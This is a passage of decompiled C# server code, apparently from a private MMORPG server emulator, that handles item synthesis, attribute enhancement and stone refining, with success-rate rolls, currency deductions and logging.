							{
								Form1.WriteLine(1, "合成系统 强化合成 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex88.Message);
							}
							goto default;
						case 49:
							try
							{
								HcItimesClass value87;
								if (合成物品表.TryGetValue(1, out value87))
								{
									装备栏包裹[value87.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value87.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
							}
							catch (Exception ex86)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex86.Message);
							}
							goto default;
						case 50:
							if (base.当前操作类型 == 102)
							{
								byte[] array10 = new byte[4];
								byte[] dst = new byte[4];
								System.Buffer.BlockCopy(封包数据, 14, array10, 0, 4);
								System.Buffer.BlockCopy(封包数据, 18, dst, 0, 4);
								if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array10, 0)].物品ID, 0) != 0 && 合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass31 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass31 = 合成物品表[1];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass31.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass31.物品全局ID, 0))
									{
										if (装备栏包裹[hcItimesClass31.位置].物品绑定)
										{
											合成提示(num, 2, 0, 装备栏包裹[hcItimesClass31.位置]);
										}
										else
										{
											hcItimesClass31.得到属性();
											if (hcItimesClass31.属性4.属性类型 != 0)
											{
												hcItimesClass31.属性4.属性类型 = 0;
												hcItimesClass31.属性4.属性数量 = 0;
												hcItimesClass31.设置属性();
											}
											else if (hcItimesClass31.属性3.属性类型 != 0)
											{
												hcItimesClass31.属性3.属性类型 = 0;
												hcItimesClass31.属性3.属性数量 = 0;
												hcItimesClass31.设置属性();
											}
											else if (hcItimesClass31.属性2.属性类型 != 0)
											{
												hcItimesClass31.属性2.属性类型 = 0;
												hcItimesClass31.属性2.属性数量 = 0;
												hcItimesClass31.设置属性();
											}
											else if (hcItimesClass31.属性1.属性类型 != 0)
											{
												hcItimesClass31.属性1.属性类型 = 0;
												hcItimesClass31.属性1.属性数量 = 0;
												hcItimesClass31.设置属性();
											}
											减去物品(BitConverter.ToInt32(array10, 0), 1);
											if (BitConverter.ToInt32(装备栏包裹[hcItimesClass31.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass31.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass31.物品全局ID, 0))
											{
												减去物品(hcItimesClass31.位置, 1);
												增加物品(hcItimesClass31.物品全局ID, hcItimesClass31.物品id, hcItimesClass31.位置, hcItimesClass31.物品数量, hcItimesClass31.物品属性);
											}
											装备栏包裹[hcItimesClass31.位置].锁定 = false;
											合成提示(num, 1, 0, 装备栏包裹[hcItimesClass31.位置]);
											合成物品表.Clear();
											合成系统解锁();
											元宝合成开关 = 0;
											打开仓库中 = false;
											RxjhClass.合成记录(base.Userid, base.UserName, 装备栏包裹[hcItimesClass31.位置].得到物品名称(), num, "八卦回天符", "成功", 装备栏包裹[hcItimesClass31.位置]);
										}
									}
								}
							}
							goto default;
						case 51:
							try
							{
								if (base.当前操作类型 == 102 && !合成物品表.ContainsKey(1) && !装备栏包裹[num2].物品绑定 && 装备栏包裹[num2].物品属性强 <= 0)
								{
									HcItimesClass hcItimesClass90 = new HcItimesClass();
									hcItimesClass90.位置 = num2;
									hcItimesClass90.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(1, hcItimesClass90);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex70)
							{
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex70.Message);
							}
							goto default;
						case 59:
							try
							{
								HcItimesClass value75;
								if (合成物品表.TryGetValue(1, out value75))
								{
									装备栏包裹[value75.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value75.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								打开仓库中 = false;
							}
							catch (Exception ex68)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 八卦回天符 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex68.Message);
							}
							goto default;
						case 60:
							try
							{
								if (base.当前操作类型 == 19 && 合成物品表 != null && 合成物品表.Count > 0)
								{
									HcItimesClass hcItimesClass87 = null;
									HcItimesClass hcItimesClass88 = null;
									HcItimesClass hcItimesClass89 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass87 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass88 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(3))
									{
										hcItimesClass89 = 合成物品表[3];
									}
									ItmeClass value76;
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass87.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass87.物品全局ID, 0))
									{
										合成提示(61, 5, 0, 装备栏包裹[hcItimesClass87.位置]);
										合成物品表.Clear();
									}
									else if (BitConverter.ToInt64(装备栏包裹[hcItimesClass88.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass88.物品全局ID, 0))
									{
										合成提示(61, 5, 0, 装备栏包裹[hcItimesClass88.位置]);
										合成物品表.Clear();
									}
									else if (hcItimesClass89 != null && BitConverter.ToInt64(装备栏包裹[hcItimesClass89.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass89.物品全局ID, 0))
									{
										合成提示(61, 5, 0, 装备栏包裹[hcItimesClass89.位置]);
										合成物品表.Clear();
									}
									else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass87.物品id, 0), out value76))
									{
										if (value76.FLD_RESIDE2 != 1 && value76.FLD_RESIDE2 != 4)
										{
											合成提示(61, 5, 0, 装备栏包裹[hcItimesClass87.位置]);
											合成物品表.Clear();
										}
										else if (装备栏包裹[hcItimesClass87.位置].物品绑定)
										{
											合成提示(num, 3, 0, 装备栏包裹[hcItimesClass87.位置]);
											合成物品表.Clear();
										}
										else
										{
											hcItimesClass87.强化属性阶段();
											hcItimesClass88.强化属性阶段();
											double num61 = RNG.Next(0, 100);
											double num62 = hcItimesClass87.阶段数量 * 10;
											if (hcItimesClass87.阶段数量 >= 10)
											{
												合成提示(61, 3, 0, 装备栏包裹[hcItimesClass87.位置]);
												合成物品表.Clear();
											}
											else
											{
												if (hcItimesClass89 != null)
												{
													num61 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass89.物品id, 0));
												}
												if (元宝合成开关 == 1)
												{
													num61 += 5.0;
												}
												if (base.FLD_VIP == 1)
												{
													num61 += 100.0 * World.VIP合成率增加百分比;
												}
												if (World.合成率 != 0.0)
												{
													num61 += 100.0 * World.合成率;
												}
												if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
												{
													num61 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
												}
												if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
												{
													num61 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
												}
												if (num61 >= num62)
												{
													if (hcItimesClass87.阶段数量 != 0 && hcItimesClass88.阶段类型 != hcItimesClass87.阶段类型)
													{
														hcItimesClass87.阶段数量 = 0;
														hcItimesClass87.设置阶段属性();
														合成提示(num, 0, 0, 装备栏包裹[hcItimesClass87.位置]);
														RxjhClass.合成记录(base.Userid, base.UserName, value76.ItmeNAME, num, "上属性", "失败", 装备栏包裹[hcItimesClass87.位置]);
													}
													else
													{
														hcItimesClass87.阶段类型 = hcItimesClass88.阶段类型;
														int num9 = ++hcItimesClass87.阶段数量;
														hcItimesClass87.设置阶段属性();
														合成提示(num, 1, 0, 装备栏包裹[hcItimesClass87.位置]);
														RxjhClass.合成记录(base.Userid, base.UserName, value76.ItmeNAME, num, "上属性", "成功", 装备栏包裹[hcItimesClass87.位置]);
													}
												}
												else
												{
													hcItimesClass87.阶段数量 = 0;
													hcItimesClass87.设置阶段属性();
													合成提示(num, 0, 0, 装备栏包裹[hcItimesClass87.位置]);
												}
												减去物品(hcItimesClass88.位置, 1);
												if (hcItimesClass89 != null)
												{
													减去物品(hcItimesClass89.位置, 1);
												}
												if (BitConverter.ToInt32(装备栏包裹[hcItimesClass87.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass87.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass87.物品全局ID, 0))
												{
													减去物品(hcItimesClass87.位置, 1);
													增加物品(hcItimesClass87.物品全局ID, hcItimesClass87.物品id, hcItimesClass87.位置, hcItimesClass87.物品数量, hcItimesClass87.物品属性);
												}
												装备栏包裹[hcItimesClass87.位置].锁定 = false;
												合成物品表.Clear();
												合成系统解锁();
												元宝合成开关 = 0;
											}
										}
									}
								}
							}
							catch (Exception ex69)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex69.Message);
							}
							goto default;
						case 61:
							try
							{
								if (base.当前操作类型 == 19)
								{
									if (合成物品表.ContainsKey(1))
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
									else if (!装备栏包裹[num2].物品绑定 && 装备栏包裹[num2].FLD_属性数量 < 10)
									{
										ItmeClass value78;
										if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value78) && value78.FLD_RESIDE2 != 1 && value78.FLD_RESIDE2 != 4)
										{
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
										else
										{
											HcItimesClass hcItimesClass93 = new HcItimesClass();
											hcItimesClass93.位置 = num2;
											hcItimesClass93.物品 = 装备栏包裹[num2].物品_byte;
											装备栏包裹[num2].锁定 = true;
											合成物品表.Add(1, hcItimesClass93);
											合成提示(num, 1, 0, 装备栏包裹[num2]);
										}
									}
									else
									{
										合成提示(num, 3, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex73)
							{
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex73.Message);
							}
							goto default;
						case 62:
							try
							{
								if (base.当前操作类型 == 19 && 合成物品表.Count != 0 && !合成物品表.ContainsKey(2))
								{
									HcItimesClass hcItimesClass109 = new HcItimesClass();
									hcItimesClass109.位置 = num2;
									hcItimesClass109.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(2, hcItimesClass109);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex83)
							{
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex83.Message);
							}
							goto default;
						case 63:
							try
							{
								if (base.当前操作类型 == 19 && 合成物品表.Count != 0 && !合成物品表.ContainsKey(3))
								{
									HcItimesClass hcItimesClass91 = new HcItimesClass();
									hcItimesClass91.位置 = num2;
									hcItimesClass91.物品 = 装备栏包裹[num2].物品_byte;
									装备栏包裹[num2].锁定 = true;
									合成物品表.Add(3, hcItimesClass91);
									合成提示(num, 1, 0, 装备栏包裹[num2]);
								}
							}
							catch (Exception ex71)
							{
								Form1.WriteLine(1, "合成系统 合成属性阶段 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex71.Message);
							}
							goto default;
						case 20:
							try
							{
								HcItimesClass hcItimesClass71;
								HcItimesClass hcItimesClass72;
								HcItimesClass hcItimesClass73;
								ItmeClass value67;
								if (base.当前操作类型 == 6 && 合成物品表.Count > 0)
								{
									hcItimesClass71 = null;
									hcItimesClass72 = null;
									hcItimesClass73 = null;
									if (合成物品表.ContainsKey(1))
									{
										hcItimesClass71 = 合成物品表[1];
									}
									if (合成物品表.ContainsKey(2))
									{
										hcItimesClass72 = 合成物品表[2];
									}
									if (合成物品表.ContainsKey(3))
									{
										hcItimesClass73 = 合成物品表[3];
									}
									if (BitConverter.ToInt64(装备栏包裹[hcItimesClass71.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass71.物品全局ID, 0) && BitConverter.ToInt64(装备栏包裹[hcItimesClass72.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass72.物品全局ID, 0) && (hcItimesClass73 == null || BitConverter.ToInt64(装备栏包裹[hcItimesClass73.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass73.物品全局ID, 0)))
									{
										hcItimesClass71.得到属性();
										hcItimesClass71.强化属性阶段();
										hcItimesClass72.强化属性阶段();
										if (装备栏包裹[hcItimesClass71.位置].物品绑定)
										{
											合成提示(21, 3, 0, 装备栏包裹[hcItimesClass71.位置]);
											合成物品表.Clear();
										}
										else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass71.物品id, 0), out value67))
										{
											if (value67.FLD_RESIDE2 != 1 && value67.FLD_RESIDE2 != 2 && value67.FLD_RESIDE2 != 4 && value67.FLD_RESIDE2 != 5 && value67.FLD_RESIDE2 != 6 && value67.FLD_RESIDE2 != 12)
											{
												合成提示(21, 5, 0, 装备栏包裹[hcItimesClass71.位置]);
												合成物品表.Clear();
											}
											else if (value67.FLD_RESIDE2 == 12)
											{
												if (BitConverter.ToInt32(hcItimesClass72.物品id, 0) == 800000013)
												{
													goto IL_3428;
												}
												合成提示(21, 5, 0, 装备栏包裹[hcItimesClass71.位置]);
												合成物品表.Clear();
												Form1.WriteLine(6, "合成系统 WGF BUG1[" + BitConverter.ToInt32(hcItimesClass71.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass72.物品id, 0) + "]");
											}
											else
											{
												if (value67.FLD_RESIDE2 == 1 || value67.FLD_RESIDE2 == 2 || value67.FLD_RESIDE2 == 5 || value67.FLD_RESIDE2 == 6)
												{
													int num50 = BitConverter.ToInt32(hcItimesClass72.物品id, 0);
													switch (num50)
													{
													default:
														合成提示(21, 5, 0, 装备栏包裹[hcItimesClass71.位置]);
														合成物品表.Clear();
														Form1.WriteLine(6, "合成系统 WGF BUG2[" + BitConverter.ToInt32(hcItimesClass71.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass72.物品id, 0) + "]");
														return;
													case 800000002:
													case 800000024:
													case 800000062:
													case 800000068:
														break;
													}
													if (value67.FLD_LEVEL >= 130)
													{
														if (num50 != 800000062 && num50 != 800000068)
														{
															合成提示(num, 5, 0, 装备栏包裹[num2]);
															return;
														}
													}
													else if (value67.FLD_LEVEL >= 80 && value67.FLD_LEVEL < 130)
													{
														if (num50 != 800000002 && num50 != 800000024)
														{
															合成提示(num, 5, 0, 装备栏包裹[num2]);
															return;
														}
													}
													else if (num50 != 800000002)
													{
														合成提示(num, 5, 0, 装备栏包裹[num2]);
														return;
													}
													if (value67.FLD_RESIDE2 == 6 && (hcItimesClass71.属性2.属性数量 != 0 || hcItimesClass71.属性3.属性数量 != 0 || hcItimesClass71.属性4.属性数量 != 0))
													{
														return;
													}
													goto IL_3428;
												}
												if (value67.FLD_RESIDE2 == 4)
												{
													int num51 = BitConverter.ToInt32(hcItimesClass72.物品id, 0);
													if (num51 != 800000001 && num51 != 800000023 && num51 != 800000061)
													{
														合成提示(21, 5, 0, 装备栏包裹[hcItimesClass71.位置]);
														合成物品表.Clear();
														Form1.WriteLine(6, "合成系统 WGF BUG3[" + BitConverter.ToInt32(hcItimesClass71.物品id, 0) + "]-[" + BitConverter.ToInt32(hcItimesClass72.物品id, 0) + "]");
														return;
													}
													if (value67.FLD_LEVEL >= 130)
													{
														if (num51 != 800000061)
														{
															合成提示(num, 5, 0, 装备栏包裹[num2]);
															return;
														}
													}
													else if (value67.FLD_LEVEL >= 80 && value67.FLD_LEVEL < 130)
													{
														if (num51 != 800000001 && num51 != 800000023)
														{
															合成提示(num, 5, 0, 装备栏包裹[num2]);
															return;
														}
													}
													else if (num51 != 800000001)
													{
														合成提示(num, 5, 0, 装备栏包裹[num2]);
														return;
													}
													goto IL_3428;
												}
												合成提示(21, 5, 0, 装备栏包裹[hcItimesClass71.位置]);
												合成物品表.Clear();
											}
										}
										else
										{
											合成提示(21, 5, 0, 装备栏包裹[hcItimesClass71.位置]);
											合成物品表.Clear();
										}
									}
								}
								goto end_IL_2e50;
								IL_34b4:
								double num52 = RNG.Next(0, 120);
								int num53 = hcItimesClass72.阶段数量;
								if (num53 > 35)
								{
									if (num53 > 90 && num53 <= 100)
									{
										num53 -= 65;
									}
									else if (num53 > 70 && num53 <= 90)
									{
										num53 -= 60;
									}
									else if (num53 > 50 && num53 <= 70)
									{
										num53 = 4;
									}
									else if (num53 > 45 && num53 <= 50)
									{
										num53 = 3;
									}
									else if (num53 > 40 && num53 <= 45)
									{
										num53 = 2;
									}
									else if (num53 >= 35 && num53 <= 40)
									{
										num53 = 1;
									}
								}
								double num54 = hcItimesClass71.属性1.数量 * 20 + hcItimesClass71.属性2.数量 * 20 + hcItimesClass71.属性3.数量 * 20 + hcItimesClass71.属性4.数量 * 20 + num53;
								if (hcItimesClass71.属性1.属性数量 != 0 && hcItimesClass71.属性2.属性数量 != 0 && hcItimesClass71.属性3.属性数量 != 0 && hcItimesClass71.属性4.属性数量 != 0)
								{
									合成提示(21, 3, 0, 装备栏包裹[hcItimesClass71.位置]);
									合成物品表.Clear();
								}
								else
								{
									if (hcItimesClass73 != null)
									{
										num52 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass73.物品id, 0));
									}
									if (元宝合成开关 == 1)
									{
										num52 += 5.0;
									}
									if (base.FLD_VIP == 1)
									{
										num52 += 100.0 * World.VIP合成率增加百分比;
									}
									if (World.合成率 != 0.0)
									{
										num52 += 100.0 * World.合成率;
									}
									if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
									{
										num52 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
									}
									if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
									{
										num52 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
									}
									if (GM模式 == 8)
									{
										num54 = 0.0;
									}
									if (num52 >= num54)
									{
										if (hcItimesClass71.属性1.属性类型 == 0)
										{
											if (hcItimesClass72.阶段类型 == 8)
											{
												hcItimesClass71.属性1.气功属性类型 = hcItimesClass72.气功属性类型;
											}
											hcItimesClass71.属性1.属性类型 = hcItimesClass72.阶段类型;
											hcItimesClass71.属性1.属性数量 = hcItimesClass72.阶段数量;
											hcItimesClass71.设置属性();
										}
										else if (hcItimesClass71.属性2.属性类型 == 0)
										{
											if (hcItimesClass72.阶段类型 == 8)
											{
												hcItimesClass71.属性2.气功属性类型 = hcItimesClass72.气功属性类型;
											}
											hcItimesClass71.属性2.属性类型 = hcItimesClass72.阶段类型;
											hcItimesClass71.属性2.属性数量 = hcItimesClass72.阶段数量;
											hcItimesClass71.设置属性();
										}
										else if (hcItimesClass71.属性3.属性类型 == 0)
										{
											if (hcItimesClass72.阶段类型 == 8)
											{
												hcItimesClass71.属性3.气功属性类型 = hcItimesClass72.气功属性类型;
											}
											hcItimesClass71.属性3.属性类型 = hcItimesClass72.阶段类型;
											hcItimesClass71.属性3.属性数量 = hcItimesClass72.阶段数量;
											hcItimesClass71.设置属性();
										}
										else if (hcItimesClass71.属性4.属性类型 == 0)
										{
											if (hcItimesClass72.阶段类型 == 8)
											{
												hcItimesClass71.属性4.气功属性类型 = hcItimesClass72.气功属性类型;
											}
											hcItimesClass71.属性4.属性类型 = hcItimesClass72.阶段类型;
											hcItimesClass71.属性4.属性数量 = hcItimesClass72.阶段数量;
											hcItimesClass71.设置属性();
										}
										RxjhClass.合成记录(base.Userid, base.UserName, value67.ItmeNAME, num, "合成", "成功", 装备栏包裹[hcItimesClass71.位置]);
										合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass71.位置]);
									}
									else
									{
										RxjhClass.合成记录(base.Userid, base.UserName, value67.ItmeNAME, num, "强化", "失败", 装备栏包裹[hcItimesClass71.位置]);
										合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass71.位置]);
									}
									减去物品(hcItimesClass72.位置, 1);
									if (hcItimesClass73 != null)
									{
										减去物品(hcItimesClass73.位置, 1);
									}
									if (BitConverter.ToInt32(装备栏包裹[hcItimesClass71.位置].物品ID, 0) != 0 && BitConverter.ToInt64(装备栏包裹[hcItimesClass71.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass71.物品全局ID, 0))
									{
										减去物品(hcItimesClass71.位置, 1);
										增加物品(hcItimesClass71.物品全局ID, hcItimesClass71.物品id, hcItimesClass71.位置, hcItimesClass71.物品数量, hcItimesClass71.物品属性);
									}
									装备栏包裹[hcItimesClass71.位置].锁定 = false;
									合成物品表.Clear();
									合成系统解锁();
									元宝合成开关 = 0;
									合成手续费 = 0;
								}
								goto end_IL_2e50;
								IL_3428:
								if (hcItimesClass71.强化数量 > 0)
								{
									合成提示(21, 3, 0, 装备栏包裹[hcItimesClass71.位置]);
									合成物品表.Clear();
								}
								else
								{
									if (合成手续费 <= 0)
									{
										goto IL_34b4;
									}
									if (base.Player_Money >= 合成手续费)
									{
										base.Player_Money -= 合成手续费;
										更新金钱和负重();
										goto IL_34b4;
									}
									合成提示(11, 4, 0, 装备栏包裹[hcItimesClass71.位置]);
									合成物品表.Clear();
								}
								end_IL_2e50:;
							}
							catch (Exception ex62)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex62.Message);
							}
							goto default;
						case 21:
							try
							{
								if (base.当前操作类型 == 6)
								{
									if (装备栏包裹[num2].锁定)
									{
										合成提示(num, 3, 0, 装备栏包裹[num2]);
									}
									else if (!装备栏包裹[num2].物品绑定 && 装备栏包裹[num2].FLD_强化数量 <= 0)
									{
										ItmeClass value66;
										if (装备栏包裹[num2].FLD_MAGIC1 != 0 && 装备栏包裹[num2].FLD_MAGIC2 != 0 && 装备栏包裹[num2].FLD_MAGIC3 != 0 && 装备栏包裹[num2].FLD_MAGIC4 != 0)
										{
											合成提示(num, 3, 0, 装备栏包裹[num2]);
										}
										else if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num2].物品ID, 0), out value66))
										{
											if (value66.FLD_RESIDE2 != 1 && value66.FLD_RESIDE2 != 2 && value66.FLD_RESIDE2 != 4 && value66.FLD_RESIDE2 != 5 && value66.FLD_RESIDE2 != 6 && value66.FLD_RESIDE2 != 12)
											{
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
											else if (!合成物品表.ContainsKey(1))
											{
												int 钱数4 = 合成手续费 = 计算合成强化费用(value66, num2, num);
												HcItimesClass hcItimesClass70 = new HcItimesClass();
												hcItimesClass70.位置 = num2;
												hcItimesClass70.物品 = 装备栏包裹[num2].物品_byte;
												装备栏包裹[num2].锁定 = true;
												合成物品表.Add(1, hcItimesClass70);
												合成提示(num, 1, 钱数4, 装备栏包裹[num2]);
											}
										}
										else
										{
											合成提示(num, 5, 0, 装备栏包裹[num2]);
										}
									}
									else
									{
										合成提示(num, 3, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex61)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex61.Message);
							}
							goto default;
						case 22:
							try
							{
								if (base.当前操作类型 == 6)
								{
									if (合成物品表 != null && 合成物品表.Count != 0 && 合成物品表.ContainsKey(1))
									{
										HcItimesClass hcItimesClass92 = 合成物品表[1];
										ItmeClass value77;
										if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass92.物品id, 0), out value77) && !合成物品表.ContainsKey(2))
										{
											if (value77.FLD_RESIDE2 != 1 && value77.FLD_RESIDE2 != 2 && value77.FLD_RESIDE2 != 5 && value77.FLD_RESIDE2 != 6)
											{
												if (value77.FLD_RESIDE2 == 4)
												{
													if (装备栏包裹[num2].Get物品ID != 800000061L && 装备栏包裹[num2].Get物品ID != 800000023L && 装备栏包裹[num2].Get物品ID != 800000001L)
													{
														合成提示(num, 5, 0, 装备栏包裹[num2]);
													}
													else if (value77.FLD_LEVEL < 80)
													{
														if (装备栏包裹[num2].Get物品ID == 800000001L)
														{
															goto IL_4004;
														}
														合成提示(num, 5, 0, 装备栏包裹[num2]);
													}
													else if (value77.FLD_LEVEL >= 80 && value77.FLD_LEVEL < 130)
													{
														if (装备栏包裹[num2].Get物品ID == 800000001L || 装备栏包裹[num2].Get物品ID == 800000023L)
														{
															goto IL_4004;
														}
														合成提示(num, 5, 0, 装备栏包裹[num2]);
													}
													else
													{
														if (value77.FLD_LEVEL < 130 || 装备栏包裹[num2].Get物品ID == 800000061L)
														{
															goto IL_4004;
														}
														合成提示(num, 5, 0, 装备栏包裹[num2]);
													}
												}
												else if (value77.FLD_RESIDE2 == 12)
												{
													if (装备栏包裹[num2].Get物品ID != 800000013L)
													{
														合成提示(21, 5, 0, 装备栏包裹[hcItimesClass92.位置]);
													}
													else
													{
														if (装备栏包裹[num2].FLD_MAGIC0 != 800002)
														{
															goto IL_4004;
														}
														装备栏包裹[num2] = new 物品类(new byte[World.数据库单个物品大小]);
														合成提示(21, 5, 0, 装备栏包裹[hcItimesClass92.位置]);
													}
												}
												else
												{
													合成提示(21, 5, 0, 装备栏包裹[hcItimesClass92.位置]);
												}
											}
											else if (装备栏包裹[num2].Get物品ID != 800000062L && 装备栏包裹[num2].Get物品ID != 800000024L && 装备栏包裹[num2].Get物品ID != 800000002L)
											{
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
											else if (value77.FLD_LEVEL >= 130)
											{
												if (装备栏包裹[num2].Get物品ID == 800000062L)
												{
													goto IL_4004;
												}
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
											else if (value77.FLD_LEVEL >= 80 && value77.FLD_LEVEL < 130)
											{
												if (装备栏包裹[num2].Get物品ID == 800000002L || 装备栏包裹[num2].Get物品ID == 800000024L)
												{
													goto IL_4004;
												}
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
											else
											{
												if (装备栏包裹[num2].Get物品ID == 800000002L)
												{
													goto IL_4004;
												}
												合成提示(num, 5, 0, 装备栏包裹[num2]);
											}
										}
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
								goto end_IL_3c34;
								IL_4004:
								合成物品表.Add(2, new HcItimesClass
								{
									位置 = num2,
									物品 = 装备栏包裹[num2].物品_byte
								});
								装备栏包裹[num2].锁定 = true;
								合成提示(num, 1, 0, 装备栏包裹[num2]);
								end_IL_3c34:;
							}
							catch (Exception ex72)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex72.Message);
							}
							goto default;
						case 23:
							try
							{
								if (base.当前操作类型 == 6)
								{
									if (合成物品表 != null && 合成物品表.Count != 0 && 合成物品表.ContainsKey(1))
									{
										if (!合成物品表.ContainsKey(3))
										{
											合成物品表.Add(3, new HcItimesClass
											{
												位置 = num2,
												物品 = 装备栏包裹[num2].物品_byte
											});
											装备栏包裹[num2].锁定 = true;
											合成提示(num, 1, 0, 装备栏包裹[num2]);
										}
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
									}
								}
							}
							catch (Exception ex59)
							{
								Form1.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex59.Message);
							}
							goto default;
						case 29:
							try
							{
								HcItimesClass value61;
								if (合成物品表.TryGetValue(1, out value61))
								{
									装备栏包裹[value61.位置].锁定 = false;
									合成提示(num, 1, 0, 装备栏包裹[value61.位置]);
								}
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
							}
							catch (Exception ex60)
							{
								元宝合成开关 = 0;
								Form1.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex60.Message);
							}
							goto default;
						case 30:
							try
							{
								if (base.当前操作类型 == 14)
								{
									if (合成物品表 != null && 合成物品表.Count == 4)
									{
										if (合成物品表[1] != null && 合成物品表[2] != null && 合成物品表[3] != null && 合成物品表[4] != null)
										{
											查百宝阁元宝数();
											if (World.每次再造消耗设置 == 0)
											{
												if (base.Player_Money >= World.每次消耗的数量)
												{
													base.Player_Money -= World.每次消耗的数量;
													更新金钱和负重();
													goto IL_4361;
												}
												合成提示(num, 4, 0, 装备栏包裹[num2]);
											}
											else
											{
												if (base.FLD_RXPIONT >= World.每次消耗的数量)
												{
													检察元宝数据(World.每次消耗的数量, 0);
													RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "再造合成石消耗", 1, World.每次消耗的数量);
													保存元宝数据();
													goto IL_4361;
												}
												合成提示(num, 4, 0, 装备栏包裹[num2]);
												系统提示("元宝不足,再造合成石需要扣除" + World.每次消耗的数量 + "元宝/次。");
											}
										}
									}
									else
									{
										合成提示(num, 5, 0, 装备栏包裹[num2]);
										系统提示("石头放少了,再造合成石最少需要4颗同类型的石头。");
									}
								}
								goto end_IL_425d;
								IL_4361:
								int num57 = RNG.Next(0, 200);
								int num58 = RNG.Next(0, 120);
								string text = "3";
								int num59 = 0;
								int value70 = 0;
								int num60 = BitConverter.ToInt32(合成物品表[1].物品id, 0);
								HcItimesClass hcItimesClass77 = 合成物品表[1];
								HcItimesClass hcItimesClass78 = 合成物品表[2];
								HcItimesClass hcItimesClass79 = 合成物品表[3];
								HcItimesClass hcItimesClass80 = 合成物品表[4];
